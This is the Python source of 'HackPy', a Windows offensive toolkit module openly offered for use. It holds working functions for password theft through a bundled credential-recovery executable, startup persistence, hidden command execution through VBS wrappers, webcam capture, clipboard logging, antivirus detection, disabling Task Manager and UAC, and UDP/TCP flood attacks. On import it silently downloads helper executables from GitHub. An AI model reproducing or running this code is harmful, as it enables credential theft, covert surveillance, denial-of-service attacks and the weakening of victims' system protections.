logo = ("""
    _  _     _   _                  _        ____
  _| || |_  | | | |   __ _    ___  | | __   |  _ \   _   _
 |_  ..  _| | |_| |  / _` |  / __| | |/ /   | |_) | | | | |
 |_      _| |  _  | | (_| | | (__  |   <    |  __/  | |_| |
   |_||_|   |_| |_|  \__,_|  \___| |_|\_\   |_|      \__, |
         Module Created by L1merBoy with Love <3     |___/
""")

# Import modules
from os import system as os_system
from os import path as os_path
from os import mkdir as os_mkdir
from os import remove as os_remove
from os import environ as os_environ
from os import startfile as os_startfile
from json import load as json_load
from time import sleep as time_sleep
from time import time as time_time
from time import ctime as time_ctime
from shutil import rmtree as shutil_rmtree
from wget import download as wget_download
from getmac import get_mac_address as getmac
from random import randint as random_randint
from random import _urandom as random_urandom
from pyperclip import copy as pyperclip_copy
from pyperclip import paste as pyperclip_paste
from socket import gethostbyname as socket_gethostbyname
from socket import gethostname as socket_gethostname
from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM

# Install path
global install_path
install_path = os_environ['TEMP'] + '\\hackpy'

# Unload (delete) HackPy from system
def unload():
	if os_path.exists(install_path):
		shutil_rmtree(install_path)
		return True

# Load file from URL
def wget(link, statusbar = None, output = None):
	return wget_download(link, bar = statusbar, out = output)

# Add to startup.
def autorun(path, name='hackpy_' + str(random_randint(1,999)) + '_', state=True):
	file = path.split('\\')[-1]
	path = path.split('\\')[0:-1]
	path = '\\'.join(path)

	autorun_path = (os_environ['SystemDrive'] + '\\Users\\' + os_environ['USERNAME'] + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
	if os_path.exists(path + '\\' + file):
		if state == True:
			with open(autorun_path + '\\' + name + ".bat", "w") as tempfile:
				tempfile.write('@cd ' + path + '\n@start "" ' + file)
			return name

		else:
			try:
				os_remove(autorun_path + '\\' + name + '.bat')
			except:
				raise FileNotFoundError('hackpy - Failed to remove: ' + file + ' from startup')
	else:
		raise FileNotFoundError('hackpy - Failed to add file: ' + file + ' to startup')

def stealler(filename = 'passwords.txt'):
	##|
	##| hackpy.stealler() # Save all passwords to passwords.txt
	##| https://github.com/AlessandroZ/LaZagne
	##|
	command.system(install_path + '\\passwords_recovery.exe all >> ' + filename)


def sendkey(key):
	##|
	##| SendKey('Hello my L0rd!!{ENTER}')
	##| Other keys: https://pastebin.com/Ns3P7UiH
	##|
	with open(install_path + '\\keyboard.vbs', "w") as tempfile:
		tempfile.write('WScript.CreateObject(\"WScript.Shell\").SendKeys \"' + key + '\"')
	os_startfile(install_path + '\\keyboard.vbs')


# Get info by ip address
# WARNING! Usage limits:
# This endpoint is limited to 150 requests per minute from an IP address. If you go over this limit your IP address will be blackholed.
# You can unban here: http://ip-api.com/docs/unban
def ip_info(ip = '', status_bar = None, out_tempfile = 'ip_info.json'):
	##|
    ##|  "query": "24.48.0.1",
    ##|  "local": "192.168.1.6",
    ##|  "status": "success",
    ##|  "country": "Canada",
    ##|  "countryCode": "CA",
    ##|  "region": "QC",
    ##|  "regionName": "Quebec",
    ##|  "city": "Saint-Leonard",
    ##|  "zip": "H1R",
    ##|  "lat": 45.5833,
    ##|  "lon": -73.6,
    ##|  "timezone": "America/Toronto",
    ##|  "isp": "Le Groupe Videotron Ltee",
    ##|  "org": "Videotron Ltee",
    ##|  "as": "AS5769 Videotron Telecom Ltee"
	##|
    wget_download('http://ip-api.com/json/' + ip, bar = status_bar, out = out_tempfile)
    with open(out_tempfile, "r") as tempfile:
        ip_data = json_load(tempfile)
    try:
        os_remove(out_tempfile)
    except:
        pass
    if ip_data.get('status') == 'success':
        ip_data['local'] = socket_gethostbyname(socket_gethostname())
        return ip_data
    else:
        raise ConnectionError('Status: ' + ip_data.get('status') + ', Message: ' + ip_data.get('message'))

# Get LATITUDE, LONGITUDE, RANGE with bssid
def bssid_locate(bssid, statusbar = None, out_tempfile = 'bssid_locate.json'):
    wget_download('http://api.mylnikov.org/geolocation/wifi?bssid=' + bssid, bar = statusbar, out = out_tempfile)
    with open(out_tempfile, "r") as tempfile:
        bssid_data = json_load(tempfile)
    try:
        os_remove(out_tempfile)
    except:
        pass

    if bssid_data['result'] == 200:
        return bssid_data['data']

# Get router BSSID
def router():
	try:
		SMART_ROUTER_IP = ('.'.join(socket_gethostbyname(socket_gethostname()).split('.')[:-1]) + '.1')
		BSSID = getmac(ip=SMART_ROUTER_IP)
	except:
		return None
	else:
		return BSSID

def install_python(version = '3.7.0', path = os_environ['SystemDrive'] + '\\python'):
	##|
	##| Install python to system
	##| Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python36')
	##| Default version is: 3.7.0 and install path is: C:\python
	##|
	if os_path.exists(path):
		raise FileExistsError('Python is installed')
	else:
		wget_download('https://www.python.org/ftp/python/' + version + '/python-' + version + '.exe', bar = None, out = 'python_setup.exe')
		command.system('python_setup.exe /quiet TargetDir=' + path + ' PrependPath=1 Include_test=0 Include_pip=1')
		if os_path.exists(path):
			return True
		else:
			return False

# Detect installed antivirus software
def detect_protection():
    SYS_DRIVE = os_environ['SystemDrive'] + '\\'
    detected = {}
    av_path = {
     'AVAST 32bit': 'Program Files (x86)\\AVAST Software\\Avast',
	 'AVAST 64bit': 'Program Files\\AVAST Software\\Avast',
	 'AVG 32bit': 'Program Files (x86)\\AVG\\Antivirus',
     'AVG 64bit': 'Program Files\\AVG\\Antivirus',
	 'Avira 32bit': 'Program Files (x86)\\Avira\\Launcher',
	 'Avira 64bit': 'Program Files\\Avira\\Launcher',
     'Advanced SystemCare 32bit': 'Program Files (x86)\\IObit\\Advanced SystemCare',
	 'Advanced SystemCare 64bit': 'Program Files\\IObit\\Advanced SystemCare',
	 'Bitdefender 32bit': 'Program Files (x86)\\Bitdefender Antivirus Free',
	 'Bitdefender 64bit': 'Program Files\\Bitdefender Antivirus Free',
	 'Comodo 32bit': 'Program Files (x86)\\COMODO\\COMODO Internet Security',
	 'Comodo 64bit': 'Program Files\\COMODO\\COMODO Internet Security',
	 'Dr.Web 32bit': 'Program Files (x86)\\DrWeb',
	 'Dr.Web 64bit': 'Program Files\\DrWeb',
     'Eset 32bit': 'Program Files (x86)\\ESET\\ESET Security',
     'Eset 64bit': 'Program Files\\ESET\\ESET Security',
	 'Grizzly Pro 32bit': 'Program Files (x86)\\GRIZZLY Antivirus',
	 'Grizzly Pro 64bit': 'Program Files\\GRIZZLY Antivirus',
	 'Kaspersky 32bit': 'Program Files (x86)\\Kaspersky Lab',
	 'Kaspersky 64bit': 'Program Files\\Kaspersky Lab',
     'Malvare fighter 32bit': 'Program Files (x86)\\IObit\\IObit Malware Fighter',
	 'Malvare fighter 64bit': 'Program Files\\IObit\\IObit Malware Fighter',
	 'Norton 32bit': 'Program Files (x86)\\Norton Security',
	 'Norton 64bit': 'Program Files\\Norton Security',
     'Panda Security 32bit': 'Program Files\\Panda Security\\Panda Security Protection',
	 'Panda Security 64bit': 'Program Files (x86)\\Panda Security\\Panda Security Protection',
	 'Windows Defender': 'Program Files\\Windows Defender',
     '360 Total Security 32bit': 'Program Files (x86)\\360\\Total Security',
	 '360 Total Security 64bit': 'Program Files\\360\\Total Security'
     }

    for antivirus, path in av_path.items():
        if os_path.exists(SYS_DRIVE + path):
            detected[antivirus] = SYS_DRIVE + path

    return detected

def webcam(filename = 'screenshot.png', delay = 4500, camera = 1):
	##|
	##| Make webcam screenshot: hackpy.webcam(filename='webcam.png', delay=5000, camera=1)
	##|
	command.system(install_path + '\\CommandCam.exe /filename ' + str(filename) + ' /delay ' + str(delay) + ' /devnum ' + str(camera))


class command:
	##|
	##| Execute system command: hackpy.command.system('command')
	##| Execute nircmdc command: hackpy.command.nircmdc('command')
	##|
	def system(recived_command):
		# Temp files names
		bat_script_path = install_path + '\\' + 'bat_script_' + str(random_randint(1, 100000)) + '.bat'
		vbs_script_path = install_path + '\\' + 'vbs_script_' + str(random_randint(1, 100000)) + '.vbs'
		# Temp files commands
		bat_script = recived_command
		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
		# Write bat commands
		with open(bat_script_path, "w") as bat_script_write:
			bat_script_write.write(bat_script)
		# Write vbs commands
		with open(vbs_script_path, "w") as vbs_script_write:
			vbs_script_write.write(vbs_script)
		time_sleep(0.1)
		os_startfile(vbs_script_path)

	def nircmdc(recived_command, priority='NORMAL'):
		command.system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmd.exe' + ' ' + recived_command)



class messagebox:
	##|
	##| Show windows message box:
    ##| hackpy.messagebox.none('Caption!', 'Hey i\'m text!')
	##| hackpy.messagebox.info('Caption!', 'Hey i\'m text!')
	##| hackpy.messagebox.error('Caption!', 'Hey i\'m text!')
	##| hackpy.messagebox.warning('Caption!', 'Hey i\'m text!')
	##|
	def info(caption, text):
		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
			msgboxfile.write('x=msgbox(\"' + text + '\" ,64, \"' + caption + '\")')
			os_startfile(install_path + '\\msgbox.vbs')
	def error(caption, text):
		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
			msgboxfile.write('x=msgbox(\"' + text + '\" ,16, \"' + caption + '\")')
			os_startfile(install_path + '\\msgbox.vbs')
	def warning(caption, text):
		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
			msgboxfile.write('x=msgbox(\"' + text + '\" ,48, \"' + caption + '\")')
			os_startfile(install_path + '\\msgbox.vbs')
	def none(caption, text):
		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
			msgboxfile.write('x=msgbox(\"' + text + '\" ,0, \"' + caption + '\")')
			os_startfile(install_path + '\\msgbox.vbs')

class ddos:
	##|
	##| UDP flood:
	##| hackpy.ddos.udp('172.217.16.46', 8080, duration = 10, message = True)
	##| TCP flood
	##| hackpy.ddos.tcp('172.217.16.46', 8080, duration = 15, message = True)
	##|
	def udp(ip, port, duration, message = False):
		sent = 0
		client = socket(AF_INET, SOCK_DGRAM)
		bytes = random_urandom(1024)
		timeout = time_time() + duration
		while True:
			if time_time() > timeout:
				break
			client.sendto(bytes, (ip, port))
			sent += 1
			if message == True:
				print("[UDP] Attacking... " + str(sent) + " sent packages " + str(ip) + " at the port " + str(port))

	def tcp(ip, port, duration, message = False):
		sent = 0
		bytes = random_urandom(1024)
		timeout = time_time() + duration
		while True:
			if time_time() > timeout:
				break
			s = socket(AF_INET, SOCK_STREAM)
			s.connect((ip, port))
			s.send(bytes)
			sent += 1
			s.close()
			if message == True:
				print("[TCP] Attacking... " + str(sent) + " sent packages " + str(ip) + " at the port " + str(port))


class clipboard:
	##|
	##| hackpy.clipboard.set('Text') # Copy text to clipboard
	##| print('Data in clipboard:' + clipboard.get()) # Get text from clipboard
	##| hackpy.clipboard.logger('clip_logs.txt') # Log all clipboard changes to file.
	##|
	def set(text):
		pyperclip_copy(text)

	def get():
		return pyperclip_paste()

	def logger(file):
		try: os_remove(file)
		except: pass
		clipboard_data_old = None
		while True:
			time_sleep(1)
			clipboard_data = str(pyperclip_paste())
			if clipboard_data != clipboard_data_old:
				with open(file, "a") as cliplogger_file:
					cliplogger_file.write('[' + time_ctime() + '] - Text: ' + str(pyperclip_paste()) + '\n')
				clipboard_data_old = str(pyperclip_paste())

class taskmanager:
	##|
	##| hackpy.taskmanager.enable()
	##| hackpy.taskmanager.disable()
	##|
	##| hackpy.taskmanager.kill('process_name.exe')
	##| hackpy.taskmanager.start('process_name.exe')
	##| hackpy.taskmanager.find('process_name.exe') # return True/False
	##|
	def enable():
		command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0')

	def disable():
		command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1')

	def kill(process):
		command.system('@taskkill /F /IM ' + process + ' >NUL')

	def start(process):
		command.system('@start ' + process + ' >NUL')

	def find(process):
		vbs_script_path = install_path + '\\' + 'task_script_' + str(random_randint(1, 100000)) + '.vbs'
		bat_script_path = install_path + '\\' + 'task_script_' + str(random_randint(1, 100000)) + '.bat'
		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
		bat_script = ('''
@echo off
set process=''' + process + '''
tasklist /FI "IMAGENAME eq %process%" 2>NUL | find /I /N "%process%">NUL
IF "%ERRORLEVEL%"=="0" (
  echo True > ''' + install_path + '''\\process_level.txt
) ELSE (
  echo False > ''' + install_path + '''\\process_level.txt
)
''')
		with open(bat_script_path, "w") as bat_script_write:
			bat_script_write.write(bat_script)
		with open(vbs_script_path, "w") as vbs_script_write:
			vbs_script_write.write(vbs_script)

		os_startfile(vbs_script_path)
		time_sleep(0.4)
		with open(install_path + '\\process_level.txt', "r") as process_read:
			data = process_read.readline()
		if data.split()[0] == 'True':
			return True
		elif data.split()[0] == 'False':
			return False
class uac:
	##|
	##| hackpy.uac.disable() # Disable UAC // NEED ADMIN!
	##| hackpy.uac.enable() # Disable UAC // NEED ADMIN!
	##|
	def disable():
		command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')

	def enable():
		command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f')


if __name__ != '__main__':
	if not os_path.exists(install_path):
		os_mkdir(install_path)
	else:
		command.system('@del ' + install_path + '\\*.bat && @del ' + install_path + '\\*.vbs')

	# Load HackPy modules
	if not os_path.exists(install_path + '\\nircmd.exe'):
		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/nircmd.exe', out = install_path + '\\nircmd.exe', bar = None)

	if not os_path.exists(install_path + '\\passwords_recovery.exe'):
		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/passwords_recovery.exe', out = install_path + '\\passwords_recovery.exe', bar = None)

	if not os_path.exists(install_path + '\\CommandCam.exe'):
		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/CommandCam.exe', out = install_path + '\\CommandCam.exe', bar = None)

else:
	print(10 * '\n' + logo)
